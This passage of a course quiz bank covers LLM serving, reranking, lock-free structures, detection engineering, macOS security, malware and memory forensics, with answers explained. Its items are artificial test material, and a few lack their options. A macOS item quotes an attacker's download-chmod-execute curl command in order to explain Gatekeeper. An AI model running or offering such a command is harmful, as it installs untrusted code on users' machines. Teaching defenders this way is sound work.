Free blocks after a preemption belong to the victim and cannot be reused
Memory just ran out, so admitting a new request would likely force another preemption soon; the freed blocks go to running requests first
Admission only runs on even steps
explain: The pool just proved too small for the running set. Admitting new work immediately would invite the next preemption and repeated recomputation. The vLLM paper and this engine admit nothing while preempted work is pending in that step.

courseTitle: LLM prompting and structured output: from prompts to masked logits
lessonTitle: Constrained decoding: masking logits with a state machine
question: At state 6 the model's probabilities are true 0.15, false 0.34, fa 0.10, and everything else is masked. What is the masked probability of 'false'?
explain: Renormalize over the allowed set: the allowed mass is 0.15 + 0.34 + 0.10 = 0.59, and 0.34 divided by 0.59 gives 0.58. Masking never changes the ratios between legal tokens; it only removes illegal ones.

courseTitle: LLM query parsing: natural language to structured filters
lessonTitle: From extracted strings to canonical IDs and a bool query
question: A developer moves the location clauses to the top-level bool: `{"bool": {"filter": [title, seniority, skill, salary], "should": [Berlin, remote]}}`. What happens to Fay in Hamburg (not remote, salary 125k)?
options: The profile is returned: with filter clauses present, should defaults to minimum_should_match 0, so location only affects the score
The profile is excluded, because should always requires at least one clause to match
Elasticsearch rejects the query because should cannot be combined with filter
The profile is excluded, because filter clauses are evaluated after should clauses
explain: The docs state the default is 1 only when there are should clauses and no must or filter clauses. Here filter exists, so the default is 0 and the should clauses only add score. Nest the disjunction in its own bool, or set minimum_should_match explicitly.

courseTitle: Latency and cost tradeoffs for LLM reranking
lessonTitle: Calls and tokens per query for each method
question: You change RankGPT's window from w=20, s=10 to w=40, s=20 at k=100, L=100. Why do input tokens fall only from 19,080 to 16,480 although calls fall from 9 to 4?
options: The larger window tokenizes more efficiently
Larger windows truncate passages
The output permutation is shorter
Passages are still read about twice, since s = w/2; only the per-window instruction and query overhead is saved
explain: Input is about 2kL plus C(I+q), where C is the number of windows. Only the C(I+q) term shrinks with fewer windows: 9 x 120 versus 4 x 120. RankGPT's own appendix (Table 12) also found larger windows did not raise nDCG@10 on DL19.

courseTitle: Latency and cost tradeoffs for LLM reranking
lessonTitle: Distilled 7B rerankers versus a cross-encoder: choosing a design
question: Budget: 400 ms of model time per query, 100 retrieved candidates. Using the course model, which design fits?
options: Cross-encoder over 100, then a FIRST-style 7B on the top 20
Generated listwise with a 7B model over all 100
Pointwise 7B over all 100 on one GPU
PRP-Sliding-10 with a 7B model
explain: Cross-encoder 56 ms plus one 265 ms FIRST window is about 321 ms. The others: 10.35 s, 2.75 s and about 39.6 s.

courseTitle: LLM as reranker: pointwise, pairwise and listwise prompting
lessonTitle: Listwise permutation generation with sliding windows
question: RankGPT reranks the BM25 top 100 with w = 20 and s = 10, one pass. The 3rd most relevant passage overall sits at BM25 rank 95. If the model ranks every window perfectly, where does it end up?
options: Rank 3
Somewhere in ranks 81 to 100, because windows only reorder locally
Rank 11, the top of the second window
It is dropped from the list
explain: In every window it enters it is among the top 10 (only 2 passages anywhere beat it), so it is always carried into the next window. The 2 better passages ride up the same way, and the last window (ranks 1 to 20) sorts them exactly: rank 3. A passage outside the overall top w - s = 10 has no such guarantee.

courseTitle: LLM routing and cascades: cheap model or strong model
lessonTitle: Cascades: answer cheaply, score the answer, escalate if unsure
question: You raise the tier-1 threshold of a two-tier cascade from 0.96 to 0.99. What happens?
options: Fewer queries escalate, so cost falls
More queries escalate: cost and mean latency rise, and accuracy usually rises because fewer weak answers are accepted
Nothing changes, since the scorer's outputs are calibrated probabilities
The weak model is skipped for hard queries, so latency falls
explain: A stricter threshold accepts fewer cheap answers, so more queries pay for the strong model and wait for both calls. The weak model still runs on every query; a cascade cannot skip it, only a router can.

courseTitle: Local feature matching: Harris, SIFT, ORB and RANSAC
lessonTitle: SIFT: keypoints across scale and a 128-number descriptor
question: Why does SIFT compare a candidate with its neighbors in the adjacent DoG scales and not only in its own image?
options: To speed up detection by skipping pixels
To choose a characteristic scale for the keypoint, so the same region is described after a zoom
To compute the 128-d descriptor
To reject points on edges
explain: Being an extremum across scale as well as space picks the blur level where the structure responds most strongly. That scale travels with the keypoint, so after a 2x zoom the detector picks a 2x larger scale and both images describe the same physical region. Edge rejection is the separate Hessian ratio test.

courseTitle: Lock-free stacks and queues: Treiber, Michael-Scott, Vyukov
lessonTitle: Why a preempted lock holder stalls everyone
question: A queue uses only atomic fetch-add and CAS, no mutex. If a producer is preempted between two of its steps, consumers can never dequeue anything past its slot until it resumes. Is the queue lock-free?
options: Yes, because it uses no locks
Yes, because consumers still return (they report empty)
No, because one stalled thread can prevent all other threads from making progress
No, because fetch-add is not a CAS
explain: The definition is about progress: some operation must complete in finite steps no matter which threads stall. Returning "empty" while items are stuck behind a stalled producer is not progress on the queue's contents. Using atomics instead of mutexes is irrelevant to the definition.

courseTitle: Lock-free stacks and queues: Treiber, Michael-Scott, Vyukov
lessonTitle: Vyukov's bounded MPMC queue: a sequence number per cell
question: Why must the capacity be a power of two in Vyukov's original code?
options: Because CAS only works on power-of-two addresses
So that the cell index is pos & buffer_mask_, a cheap mask that stays consistent as pos grows forever
So that sequence numbers never wrap
Because cache lines are 64 bytes
explain: The constructor asserts buffer_size is a power of two and stores buffer_size - 1 as the mask. Masking only equals pos mod capacity for powers of two. crossbeam lifts the restriction by splitting stamps into an index and a lap instead.

courseTitle: Log parsing and log analytics: templates instead of regex
lessonTitle: How accurate is this really, and by which metric
question: A vendor says their parser reaches 0.95 accuracy on your logs. Which single follow-up question is most likely to change your decision?
options: Which programming language is it written in?
Is that per message or per template, and does correct mean grouped correctly or every token identified correctly?
What similarity threshold did you use?
How many datasets did you average over?
explain: Message-level grouping metrics are dominated by frequent templates: 0.95 is reachable by parsing only the 1 percent of templates that carry 95 percent of the volume. Template-level FGA and the token-exact FTA are far stricter, and Drain's FGA falls from about 0.75 to 0.55 when moving from 2,000-line samples to fully annotated million-line logs. The threshold and the language matter much less than knowing what the number counts.

courseTitle: Logging and detection engineering
lessonTitle: What to log, source by source
question: An attacker signs in with a stolen password, approves their own newly registered MFA device, and reads files in a SaaS (software as a service: a hosted web application) app. No program runs on any company laptop. Which source is most likely to show it?
options: Endpoint process creation logs
The identity provider's sign-in and MFA registration logs
Firewall deny records
DNS query logs
explain: Valid-credential intrusions leave little on endpoints or networks. The identity provider records the unusual sign-in and the new device, which is exactly the signal FireEye, a US security company, followed in 2020 (lesson 16).

courseTitle: Logging and detection engineering
lessonTitle: Time: clocks, time zones and the order of events
question: Which timestamp should a scheduled rule window on to avoid missing late-arriving events?
options: @timestamp only
event.ingested, or overlapping @timestamp windows with duplicate suppression
The analyst's local clock
The PRI field
explain: Windowing on arrival time guarantees every stored event is searched once. Overlapping windows on event time work too, at the price of deduplication.

courseTitle: Logging and detection engineering
lessonTitle: Sigma: one rule format, many SIEMs
question: Why does a rule say `category: process_creation, product: windows` instead of naming Sysmon?
options: Sigma cannot read Sysmon
So one rule applies to any Windows process-creation source; processing pipelines map it to Sysmon, 4688 or an EDR feed per environment
Category is required by Splunk
To lower the rule's level
explain: The abstract logsource is what makes rules portable. The environment-specific mapping lives in the pipeline, not in every rule.

courseTitle: Logging and detection engineering
lessonTitle: Baselines, anomalies and UEBA: how Storm-0558 was caught
question: Which of these is a limit of anomaly detection that Sommer and Paxson identify?
options: It cannot run on network data
It needs Sigma rules
The semantic gap: an alert says something is unusual, not why it is malicious, so analysts must interpret it
It only works on Windows
explain: Unusual is not the same as malicious. Without context the analyst cannot act, which is why anomaly output works best as an investigation lead.

courseTitle: Long context: RoPE scaling, YaRN and Ring Attention
lessonTitle: YaRN: a per-frequency ramp plus attention temperature
question: A colleague implements YaRN by scaling queries by 1.2773 for s = 16 but forgets the keys. What is the effect on the logits?
options: Correct: the temperature is defined on queries only
Logits are unchanged because softmax is scale invariant
Logits are scaled by 1.2773 instead of the intended 1.6314
Logits are scaled by 1.6314 squared
explain: YaRN multiplies both rotated q and k (via cos and sin) by sqrt(1/t) = 0.1 ln 16 + 1 = 1.2773, so the dot product is scaled by 1.2773 squared = 1.6314. Scaling only one side gives just 1.2773. Softmax is shift invariant, not scale invariant.

courseTitle: Long context: RoPE scaling, YaRN and Ring Attention
lessonTitle: Build it: YaRN tables and a four-host ring in NumPy
question: A teammate's ring simulation matches full attention when the mask is off, but with a causal mask 252 of 256 rows are wrong; only the last row of each 64-token block is right. Which block-level rule did they most likely forget?
options: Skipping future blocks (j > i)
Rescaling l and o when the running max grows
Masking the upper triangle inside the diagonal block (j = i)
Passing KV to host i + 1 instead of i - 1
explain: We ran exactly this bug: without the diagonal mask every query sees the later keys of its own block, except the block's last token, which legitimately sees all 64. Forgetting the j > i skip instead corrupts whole blocks (error 1.9 in our run). A wrong rescale would break the unmasked case too.

courseTitle: Looped and recurrent-depth transformers
lessonTitle: What a loop can compute: algorithms, latent thoughts, fixed points
question: Yang et al. train a looped transformer without input injection (Y_(t+1) = M(Y_t), Y_0 = P). What did they observe when running more loops than in training?
options: Error kept falling, because more loops always help
Error was unchanged, because the state had converged
Error grew quickly (diverged) past the trained loop count
The model refused to run more loops
explain: Without re-injecting the prompt, the influence of the start fades and the state drifts once the loop count leaves the trained range. With injection, the end point stays tied to the input, which is the same reason Huginn feeds e into every iteration.

courseTitle: Looped and recurrent-depth transformers
lessonTitle: When looping helps, when it hurts, and the design space
question: For k = 8, Saunshi et al. report open-book QA scores of 33.9 (24 layers), 22.7 (8 layers) and 30.8 (8 layers looped 3x). What is the % Gap?
options: About 24%
About 51%
About 72%
About 136%
explain: (30.8 - 22.7) / (33.9 - 22.7) = 8.1 / 11.2 = 0.72, about 72%, matching the paper's table. The looped model recovers most of the missing parameters' benefit on this context-reasoning group.

courseTitle: LoRA, QLoRA and parameter-efficient fine-tuning
lessonTitle: Counting parameters, choosing targets, merging for free inference
question: You add a rank-8 LoRA to one MLP up-projection of shape 4096 by 11008. How many trainable parameters does that adapter have?
explain: r(d + k) = 8 x (4096 + 11008) = 8 x 15104 = 120,832. 65,536 would be a square 4096 matrix, and 45,088,768 is the full matrix itself.

courseTitle: LoRA, QLoRA and parameter-efficient fine-tuning
lessonTitle: The wider PEFT family, and when LoRA falls short
question: Your LoRA r = 16 on attention only underperforms full fine-tuning on a code instruction set. Which change is most supported by the evidence in this course?
options: Lower the learning rate by 10x
Switch to adapting only Wq
Target all linear layers including the MLP and raise the rank
Initialize B randomly instead of to zero
explain: QLoRA needed all linear layers to match full fine-tuning, and Biderman et al. found MLP modules drive most gains and that code needs high ranks. Their recommendation was a higher learning rate than full fine-tuning, not lower.

courseTitle: Machine unlearning: removing data and knowledge from trained models
lessonTitle: Certified removal: what 'as if retrained' means formally
question: You use Newton-step removal on an L2-regularized least-squares regressor. How much loss perturbation noise do you need for certified removal?
options: The same as for logistic regression, since both are linear models
A lot, because least squares is not differentially private
None: the loss is quadratic, so one Newton step lands exactly on the retrained optimum (epsilon = 0)
It cannot be certified, because the Hessian changes with w
explain: The Newton step uses a local quadratic model of the loss, which is exact for least squares: its Hessian does not depend on w. The gradient residual is exactly zero, so Guo et al. note no perturbation is needed. Logistic loss is not quadratic, which is why it leaves a residual to mask.

courseTitle: Machine unlearning: removing data and knowledge from trained models
lessonTitle: Hidden, not gone: relearning, probing and quantization attacks
question: A lab applies RMU to an open-weight model and publishes near-chance WMDP scores as evidence the model is safe to release. What is the strongest objection?
options: WMDP has too few questions to be meaningful
RMU always destroys general capabilities
With open weights anyone can fine-tune on related data, and RMU did not prevent relearning in the WMDP paper's own fine-tuning experiment
Near-chance scores prove the model was never trained on the data
explain: The WMDP appendix reports that fine-tuning an RMU-unlearned Mistral-7B on the forget corpus recovered performance, and Hu et al. show even benign related data can jog the knowledge back. RMU's stated threat model is a closed model unlearned just before serving, not a public release.

courseTitle: macOS security for defenders
lessonTitle: Quarantine and Gatekeeper: the first-launch check
question: An attacker's instructions tell the victim to run `curl -o /tmp/x https://... && chmod +x /tmp/x && /tmp/x`. Why does Gatekeeper not prompt?
options: Because /tmp is protected by SIP
Because chmod removes the signature
Because Gatekeeper only checks apps from the App Store
Because curl does not set the quarantine attribute, so the launch never invokes Gatekeeper
explain: Apple's DTS notes that curl does not quarantine downloads. Without the attribute the first-launch assessment is never triggered. The binary still needs a valid (even ad hoc) signature to run on Apple silicon, which attackers can add trivially.

courseTitle: macOS security for defenders
lessonTitle: TCC: consent prompts, the databases and who is asking
question: Malware running as the user tries to read `~/Documents/contracts.pdf`. Unix permissions allow it. What decides the outcome?
options: TCC: the malware's process needs the user's consent (or Full Disk Access) for Documents
Nothing: Unix permissions are final
SIP, because Documents is a system folder
Gatekeeper, because the file was downloaded
explain: Documents is TCC-protected on macOS 10.15 or later. The responsible app needs a stored allow for Documents or Full Disk Access; otherwise tccd denies or prompts.

courseTitle: macOS security for defenders
lessonTitle: Unified logging: reading what the Mac recorded
question: Your query returns `opened <private>` where you hoped to see a file path. Why?
options: The log was tampered with
The path was too long
Dynamic strings are redacted by default unless the developer marked them public
The message was at debug level
explain: Apple's documentation: the unified log redacts dynamic strings and objects by default; developers opt in with %{public}. Integers and Booleans are not redacted.

courseTitle: macOS security for defenders
lessonTitle: FileVault, secure boot and startup security
question: A Mac with Apple silicon has FileVault off. A thief removes nothing, just boots it. What protects the data?
options: The data is unencrypted
The thief needs the recovery key
The Secure Enclave refuses to boot
The volume is encrypted, but the key is protected only by the hardware UID, so the Mac unlocks it at boot; only the login password stands in the way
explain: Apple: with FileVault off the volume key is protected only by the hardware UID. The disk is useless in another Mac, but on this Mac nothing cryptographic depends on the user's password.

courseTitle: Malware and reverse engineering
lessonTitle: What malware is, and the families analysts name
question: A file arrives as an email attachment, shows a fake invoice, does not copy itself anywhere, and silently downloads a second program from the internet. Which labels fit best?
options: Worm and wiper
Virus and rootkit
Trojan and loader
Worm and ransomware
explain: It looks benign and does not replicate (trojan), and its job is fetching other malware (loader). A worm would spread to other machines on its own; a virus would infect other files.

courseTitle: Malware and reverse engineering
lessonTitle: Reading x86-64 assembly: registers and core instructions
question: Which register holds a function's integer return value on x86-64?
options: rsp
rcx
rax
rip
explain: rax (or its low half eax) carries the return value. rsp is the stack pointer, rcx carries the first argument on Windows, and rip points at the next instruction.

courseTitle: Malware and reverse engineering
lessonTitle: Command and control: beacons, jitter and Cobalt Strike
question: A Beacon checks in every 300 seconds with 20% jitter. Which set of gaps between check-ins is consistent with Fortra's documentation?
explain: With 20% jitter the documented range is 240 to 300 seconds. Only the first set stays in that window.

courseTitle: Malware and reverse engineering
lessonTitle: Sharing intelligence and writing the analysis report
question: In TLP 2.0, what does TLP:AMBER+STRICT allow?
options: Sharing only within the recipient's own organisation
Public sharing
Sharing with the whole community but not the press
Sharing only with named individuals in the meeting
explain: FIRST's standard: AMBER allows the recipient's organisation and its clients on a need-to-know basis; AMBER+STRICT restricts sharing to the organisation only.

courseTitle: Megatron-Core performance: TP, PP, CP, MoE, FP8 and MFU
lessonTitle: Why one GPU cannot train a 175B model, and the five ways to split it
question: A team has a 1.3B model (about 23 GB of model state at 18 bytes per parameter) that fits on one 80 GB GPU with its activations, and wants to train faster on 64 GPUs. Following the Megatron guidance, what should they try first?
options: TP=8 so every layer is split as finely as possible
Plain data parallelism (DP=64), adding model parallelism only if memory runs out
PP=64 so each GPU holds one or two layers
CP=64 so each GPU holds a sliver of each sequence
explain: The Megatron Core guide says to start with data parallelism and add TP, then PP, only when the model does not fit. Model parallelism adds communication and makes per-GPU matrix multiplies smaller, so it is a cost you pay for memory, not a free speedup.

courseTitle: Megatron-Core performance: TP, PP, CP, MoE, FP8 and MFU
lessonTitle: Activation memory: sequence parallelism, selective recompute, CP
question: Why does sequence parallelism not increase communication over plain TP?
options: It compresses activations before sending them
It skips the backward-pass communication
An all-reduce is a reduce-scatter plus an all-gather, and SP issues exactly those two halves at different points
It sends activations only between pipeline stages
explain: TP does 4 all-reduces per layer per step; TP + SP does 4 all-gathers and 4 reduce-scatters. A ring all-reduce is implemented as reduce-scatter then all-gather, so the bandwidth used is the same. The paper even measured a small speedup from running layer norm and dropout on 1/t of the data.

courseTitle: Megatron-Core performance: TP, PP, CP, MoE, FP8 and MFU
lessonTitle: Measuring the result: MFU, HFU and what the numbers count
question: A Llama-style 70B model is trained with 8K-token sequences on 64 GPUs (8 per node). Which configuration fits the Megatron Core guidance best?
options: TP = 4, PP = 4, CP = 2, DP = 2
TP = 64, nothing else
TP = 1, PP = 64
TP = 16 across two nodes, DP = 4
explain: This is the guide's own example: TP stays inside a node, PP splits the 80 layers across nodes, CP = 2 handles the 8K sequence, and DP uses what is left (4 x 4 x 2 x 2 = 64). TP = 64 or 16 crosses nodes with all-reduces every layer; PP = 64 gives a huge bubble.

courseTitle: Memory forensics
lessonTitle: Acquiring RAM: WinPmem, DumpIt, LiME, AVML and virtual machines
question: A responder runs LiME with format=raw on a server with several separate RAM ranges. Why does the LiME README advise against this?
options: Raw concatenates the ranges and loses where each one sat in physical memory, so most analysis tools cannot translate addresses
Raw output is encrypted and needs a key
Raw is slower than every other format
Raw format skips the kernel's memory entirely
explain: Address translation needs physical positions. The lime format keeps a header per range, padded fills the gaps with zeros, but raw just glues the ranges together.

courseTitle: Memory forensics
lessonTitle: Know normal: the process tree, command lines and the PEB
question: Why is a command line read from the PEB weaker evidence than a field read from EPROCESS?
options: The PEB is compressed and loses characters
EPROCESS is copied to disk at every boot
The PEB sits in the process's own user memory, so code running in that process can rewrite it
The PEB is only present on Linux
explain: Anything running in user mode inside the process can edit its PEB, including the command line and image path. Kernel structures need kernel access to change.

courseTitle: Memory forensics
lessonTitle: Credential artefacts: what memory exposes and how to scope it
question: Lab 0's baseline shows lsass handles held only by System, csrss, wininit and lsass. In a case image, rundll32.exe holds a Process handle to lsass with access 0x1fffff. Why does that matter?
options: 0x1fffff means the handle is closed
Any handle to lsass is normal
0x1fffff is PROCESS_ALL_ACCESS, which includes PROCESS_VM_READ, so rundll32 could read LSASS memory
It means rundll32 is a protected process
explain: PROCESS_ALL_ACCESS grants every right including VM_READ. An unexpected holder with that access is a direct lead for credential theft.

courseTitle: Memory forensics
lessonTitle: Anti-forensics against memory analysis, and the cross-view answer
question: A driver appears in windows.modscan but not in windows.modules. What is the most useful interpretation?
options: modscan is always wrong
The driver may have been unloaded or unlinked from the module list; check for an unload record, its memory and any hooks pointing into it
The driver belongs to the analysis machine
It proves the image was taken from a hypervisor
explain: Like psscan, modscan finds structures regardless of the list. A scan-only driver is either history (unloaded) or hidden; hooks into its memory or callbacks registered by it decide which.

courseTitle: Memory fragmentation: why freed memory stays used
lessonTitle: Placement policy: where a block goes decides what survives
question: Which allocator change is most likely to raise fragmentation, based on Johnstone and Wilson's results?
options: Switching from address-ordered first fit to next fit with a roving pointer
Switching from best fit to address-ordered first fit
Coalescing freed blocks immediately
Using segregated free lists that approximate best fit
explain: Next fit spreads allocation over the whole heap, which interrupts the "let old regions rest and merge" effect. AO first fit and best fit (with 8K sbrk) were both under 1% on average, immediate coalescing is a shared trait of the good policies, and segregated fit (Lea) approximates best fit.

courseTitle: Memory ordering (acquire/release, seq_cst) and the C++/Rust model
lessonTitle: Relaxed: one agreed history per variable, nothing more
question: A thread writes a 4 KB config buffer with plain writes, then does `READY.store(true, Relaxed)`. A reader spins until `READY.load(Relaxed)` is true and then reads the buffer. What is wrong?
options: Nothing: the reader saw true, so it must also see the buffer
The store of true might never become visible
Relaxed creates no happens-before, so the reader can see stale buffer contents and the buffer accesses are a data race
AtomicBool cannot be used with Relaxed
explain: Reading true from a relaxed store says nothing about other memory. The buffer writes and reads are not ordered by happens-before, which is a data race and undefined behavior. The fix is Release on the store and Acquire on the load (next lesson).

courseTitle: Memory reclamation: epochs, hazard pointers, RCU
lessonTitle: Why freeing a removed node is the hard part
question: T2 pops node A from a lock-free stack and calls `free(A)` immediately. T1 had loaded `top == A` just before. Which statement is correct?
options: It is safe because T1's CAS will fail when it sees that top changed
It is safe if the stack uses tagged pointers
It is unsafe because T1 will dereference A to read its next field, even if its later CAS would fail
It is unsafe only on weakly ordered CPUs such as ARM
explain: The CAS comes last. Before it, T1 reads `A->next`, which touches freed memory. A failing CAS or a tag check cannot undo a read that already happened. This is independent of the CPU memory model: it is a use-after-free in program order.

courseTitle: Memory reclamation: epochs, hazard pointers, RCU
lessonTitle: Choosing a scheme: read cost versus bounded garbage
question: A user-space service runs 200 threads on 16 cores and frequently preempts threads mid-operation. Updates are frequent and memory is tight. Which scheme fits best?
options: Hazard pointers, because garbage stays bounded even when threads are preempted
Classic QSBR, because reads are free
EBR, because pinning is cheaper than a fence per node
No reclamation, because the process restarts nightly
explain: Oversubscription means many threads are descheduled mid-operation. Under EBR or QSBR any one of them stalls all reclamation, and Hart et al. showed that preemption plus write-heavy workloads can make QSBR and EBR exhaust memory. Hazard pointers cap the backlog at N x R.

courseTitle: Memory safety bugs: overflows, use-after-free and friends
lessonTitle: Stack buffer overflow: when a copy runs past the end
question: After 23 'A's, the program crashes on return rather than during strcpy (without AddressSanitizer). Why?
options: strcpy checks the bounds but only reports the error when the function returns
The overwrite itself is a legal write into the stack; the damage is only used when ret loads the corrupted return address
The operating system checks every write but only kills the process at the next return
The return address is read-only until ret runs
explain: Writing into the stack is allowed: those addresses are mapped and writable. Nothing goes wrong until the corrupted value is used, which is when ret jumps to 0x0041414141414141. That delay is why overflow bugs can be hard to trace without a tool like AddressSanitizer.

courseTitle: Memory safety bugs: overflows, use-after-free and friends
lessonTitle: Use-after-free and double free: dangling pointers
question: After `free(p); p = NULL;` the program still crashes with a use-after-free. What is the most likely reason?
options: Another variable, such as an entry in a list, still holds a copy of the old address
free(NULL) is undefined, so the cleanup line is the real bug
p = NULL only takes effect when the function returns
AddressSanitizer is reporting a false alarm
explain: Clearing p only clears that one variable. Any other copy of the pointer still dangles. That is why real UAFs are usually ownership or synchronization bugs, as in the Chrome case, rather than a forgotten NULL.

courseTitle: Memory safety bugs: overflows, use-after-free and friends
lessonTitle: Why memory-safe languages remove whole bug classes
question: A team rewrites its image parser in Rust without any `unsafe` blocks. Which bug from this course can it still have?
options: A logic bug that accepts a huge width and exhausts memory, or panics on a bad index
A use-after-free of a decoded frame
A heap overflow from an unchecked length
A format string bug through println!
explain: Safe Rust checks bounds and lifetimes, so overflows and UAFs become panics or compile errors, and its formatting macros require literal format strings. It does not stop logic errors: accepting absurd sizes or panicking on bad input is still a denial-of-service bug that needs validation.

courseTitle: Metric learning and re-identification
lessonTitle: ArcFace: putting an angular margin inside a classifier
question: Why does ArcFace need the scale s at all?
options: To make the margin m measured in degrees
With unit vectors the logits are cosines in [-1, 1], so softmax can never become confident; s widens the logit range
To keep the class weights from growing
To normalize the features to unit length
explain: Cosines are bounded by 1. With s = 1 and 3 classes, even the best case (cosine 1 to the true class, -1 to the others) gives p = 0.787. Scaling by s lets the probabilities approach 1 so the cross-entropy can be driven down.

courseTitle: Microbenchmarking pitfalls: when the number lies
lessonTitle: Warm caches in the benchmark, cold caches in production
question: Which setup best measures a function that in production runs once per request on cold data?
options: Many iterations on one small input with a long warm-up
Many iterations, each preceded (outside the timed region) by touching a buffer larger than the last-level cache, with batching to amortize pause overhead
One iteration, measured once
Many iterations on a single input with ASLR (address space layout randomization) disabled
explain: Evicting the caches before each timed call recreates the cold state, and batching keeps the PauseTiming overhead small relative to the work. A long warm-up measures the hot case. A single run is dominated by noise and timer overhead. ASLR, which places the stack, heap and libraries at random addresses on each run, affects layout, not cache warmth.

courseTitle: Miles: production RL post-training forked from slime
lessonTitle: Fully async RL: busy engines, paid for in staleness
question: An agentic batch has 8 trajectories per group; one takes 40 turns while the rest finish in 3. Which setting keeps engine slots busiest while that trajectory runs?
options: --rollout-submission-granularity group, so the group stays together
--pause-generation-mode abort, to kill stragglers
--update-weights-interval 0
--rollout-submission-granularity sample, so each finished trajectory frees its own slot
explain: With sample granularity, the seven short trajectories free their slots as soon as they finish, and new groups start in them. With group granularity, all eight slots stay reserved until the 40-turn trajectory returns. Abort mode is rejected under fully async.

courseTitle: Miles: production RL post-training forked from slime
lessonTitle: Moving a trillion parameters, and surviving dead engines
question: A disk-delta update in XOR encoding is accidentally applied twice to the same rollout host. What state does the host end up in?
options: The new weights, because XOR is idempotent
The previous weights, because XOR applied twice cancels itself
A corrupted mix, detected only at the next step
The base checkpoint from step 0
explain: XOR is an involution: (w XOR d) XOR d = w. So a second application silently undoes the update. That is why the report says an XOR delta must be applied exactly once and against its declared base, and why the overwrite encoding exists for retry-prone setups.

courseTitle: ML for systems: learned indexes, caching and scheduling
lessonTitle: LRB: learning to evict like a relaxed Belady
question: LRB samples training examples uniformly over objects in the memory window rather than over requests. Why?
options: Sampling requests would be too slow to compute
Sampling requests over-represents popular objects, while the decisions LRB must learn are mostly about rarely requested objects it should evict
GBMs cannot train on duplicate objects
Objects that are never requested again would be sampled too often
explain: Per-request sampling picks a hot object once per request, so the dataset fills with objects that should obviously stay. The good evictions, objects beyond the boundary including those never requested again, would be rare. The paper samples over objects so both kinds are represented.

courseTitle: Mobile app security testing: OWASP MASVS and MASTG
lessonTitle: Inside an APK and an IPA: what anyone can download and read
question: A client ships an update and its users report that it will not install over the old version: 'App not installed'. The release engineer used a new signing key. Why does Android refuse?
options: The new key's certificate has expired
Android compares the update's certificate with the installed app's and allows the update only if they match (or the new key was rotated in with proof from the old one)
The new APK is missing classes.dex
Google Play must countersign every certificate
explain: The package name plus the signing key are the app's identity, so an unrelated new key looks like a different author. Android's docs say a new certificate means a new package name and a separate app. The certificate in our output is self-signed and valid until 2043, so expiry and CA countersigning are not the issue.

courseTitle: Mobile app security testing: OWASP MASVS and MASTG
lessonTitle: Android IPC: exported components, intent redirection, PendingIntents
question: Your app forwards an intent from an extra, but only after checking `next.component?.packageName == packageName`. Is that enough?
options: Yes: if the target is inside our own app, nothing can go wrong

No: forwarding to the app's own non-exported components is exactly the danger, and grant flags or extras can still be attacker-chosen; allowlist the specific component and extras and strip grant flags
Yes, as long as the activity is exported
No, because package names can be spoofed by the sender
explain: Intent redirection is dangerous precisely because the target is inside your app: the attacker borrows your identity to reach your private components and providers. Checking 'it is our package' lets all of that through. Android's guidance is to check the exact destination and clear the URI-grant flags, as IntentSanitizer does.

courseTitle: Mobile app security testing: OWASP MASVS and MASTG
lessonTitle: Local authentication: a fingerprint must unlock a key, not a boolean
question: A password manager wants the vault to stop opening if a new fingerprint is added to the phone. Which iOS access control flag fits?
options: .userPresence
.biometryCurrentSet
.devicePasscode
kSecAttrAccessibleAlways
explain: Apple's documentation: with .biometryCurrentSet the item is invalidated if fingers are added or removed, or Face ID is re-enrolled. .userPresence stays usable after enrollment changes and also accepts the passcode. The last option is not an access control flag for biometrics at all.

courseTitle: Multi-head latent attention (MLA)
lessonTitle: Why per-head keys and values make the KV cache huge
question: Why didn't DeepSeek simply use MQA, which has an even smaller cache than MLA?
options: MQA cannot be used with a KV cache
In their 7B ablation MQA lost clearly to MHA on hard benchmarks, and they wanted MHA-level quality
MQA needs more GPU memory for weights
MQA does not support causal masking
explain: DeepSeek-V2 Appendix D.1 shows MQA at 37.9 MMLU vs 45.2 for MHA at 7B. MLA was designed to get a small cache without paying that quality cost.

courseTitle: Multi-head latent attention (MLA)
lessonTitle: Build an MLA layer and prove the two forms agree
question: A decoder caches the latent before RMSNorm and applies the norm when reading it back. The plain form normalizes before up-projecting. Do the two still agree?
options: Yes: RMSNorm acts on each token's latent alone, so normalizing at write time or at read time gives the same vectors; it only costs repeated work on every read
No: RMSNorm mixes information across tokens
No: the norm must come after absorption
Yes, but only if the RoPE key is normalized too
explain: RMSNorm is per token, so both orders give identical vectors; DeepSeek's code normalizes once on write because every later step reads it. What does break the match is normalizing the 64-wide RoPE key (the plain form never does) or skipping the norm on one side.

courseTitle: Serving many LoRA adapters on one base model
lessonTitle: Why serving one model per fine-tune wastes GPUs
question: 100 merged 7B fine-tunes would fit on a large cluster. Why is serving them as separate models still inefficient when each gets little traffic?
options: Merged models are slower per token than the base model
Each model decodes tiny batches, so most of each weight read serves only one or two tokens
Merged weights cannot use the KV cache
The adapters must be recomputed for every token
explain: Decode is bandwidth bound: the cost of a step is dominated by reading the weights, and batching shares that read. Splitting traffic across 100 copies leaves each with batch sizes near 1, so GPU time per token stays high.

courseTitle: Serving many LoRA adapters on one base model
lessonTitle: Multi-LoRA in vLLM and LoRAX, and the cost model
question: You serve adapters of rank 8 and 16 with vLLM but set --max-lora-rank 256. What is the main consequence?
options: Requests fail because ranks must match exactly
Adapters are automatically retrained at rank 256
Throughput improves because larger slots are faster
GPU memory is reserved for rank-256 slots, wasting space that the KV cache could use
explain: vLLM preallocates each of the max_loras slots at max_lora_rank and pads smaller adapters into them. The docs warn that setting it much higher than needed wastes memory and can hurt performance.

courseTitle: Multi-query retrieval: many phrasings, one fused result
lessonTitle: How N trades recall against latency and cost
question: Searches run in parallel and the LLM rewrite takes 600 ms. You raise N from 4 to 8. Which effect is largest, under the model in this lesson?
options: End-to-end latency roughly doubles
Latency and load both stay the same
Recall doubles
End-to-end latency rises a little, while retriever load and candidate count roughly double
explain: In parallel, the search phase grows with the slowest of N (about m H_N: 83 ms to 109 ms at m = 40), small next to 600 ms of LLM time. But every extra query is another search to serve and more candidates downstream, so load and context grow linearly. Recall gains shrink as N grows.

courseTitle: Multi-stage retrieval: designing the retrieve-then-rerank cascade
lessonTitle: Bi-encoder, late interaction, cross-encoder: where the cost goes
question: Which scorer could you put directly over a 50-million-document index as the **first** stage?
options: A cross-encoder, if you batch on a large GPU
A bi-encoder or late-interaction model, because document vectors are precomputed and searchable with ANN
Only BM25; neural models cannot be first stages
duoBERT with the SAMPLE aggregation
explain: First stages need precomputed document representations so the query can be matched with an index. Bi-encoders give one vector per document; ColBERT indexes token vectors and retrieves end to end. A cross-encoder has nothing to index: it needs a forward pass per pair.

courseTitle: Multi-token prediction: training GPTs to look ahead
lessonTitle: From one target per position to n targets per position
